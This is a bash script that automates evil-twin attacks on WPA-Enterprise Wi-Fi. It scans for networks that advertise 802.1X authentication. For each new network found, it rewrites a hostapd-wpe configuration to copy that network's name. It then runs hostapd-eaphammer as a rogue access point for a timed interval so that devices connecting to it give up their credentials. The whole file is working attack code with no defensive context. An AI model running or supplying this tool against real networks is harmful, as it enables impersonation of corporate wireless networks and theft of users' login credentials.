#!/bin/bash

[[ $# -ge 1 ]] && attack_time="$1" || attack_time=15
[ -z "$IFACE" ] && IFACE='wlan0'
AGO=3
declare -a essids

cp /etc/hostapd-wpe/hostapd-wpe.conf /tmp/hostapd-wpe.conf
sed -i "s/interface=.*/interface=$IFACE/g" /tmp/hostapd-wpe.conf

function monitor(){
	sudo tcpdump -i $IFACE -e -nn 2> /dev/null | while read line
	do
		if echo "$line" | grep -q 'Probe'; then
			essid=$(echo "$line" | sed -rn 's/.*SA:(.+) Probe Request .*\(([^\)]+)\).*/\2/p')
			[[ "x" != "x$essid" ]] && echo $(date +"%s") "$essid"
		elif echo "$line" | grep -q 'Beacon'; then
			essid=$(echo "$line" | sed -rn 's/.*BSSID:(.+) DA.* Beacon \(([^\)]+)\).*/\2/p')
			echo $(date +"%s") "$essid"
		fi
	done
}

function scan(){
	sudo ifconfig $IFACE up
	while :; do
		sudo iw dev $IFACE scan
		sleep 1
	done | grep -e 'SSID:' -e 'Authentication suites:' --line-buffered | while read line
	do
		if echo "$line" | grep -q 'SSID:'; then
			essid=$(echo "$line" | sed -rn 's/.*SSID: (.*)/\1/p')
			echo -n . >&2
		elif echo "$line" | grep -q 'Authentication suites:'; then
			if echo "$line" | grep -q '802.1X'; then
				echo $(date +"%s") "$essid"
			fi
		fi
	done
}

scan | while read ts essid
do
	[[ "$[ts+AGO]" -ge $(date +"%s") ]] || continue
	if [[ ! "${essids[*]}" =~ "$essid" ]]; then
		sed -i "s/ssid=.*/ssid=$essid/g" /tmp/hostapd-wpe.conf
		echo "[+] attacking $essid"
		sudo timeout $attack_time hostapd-eaphammer -x /tmp/hostapd-wpe.conf
		essids+=("$essid")
	fi
done
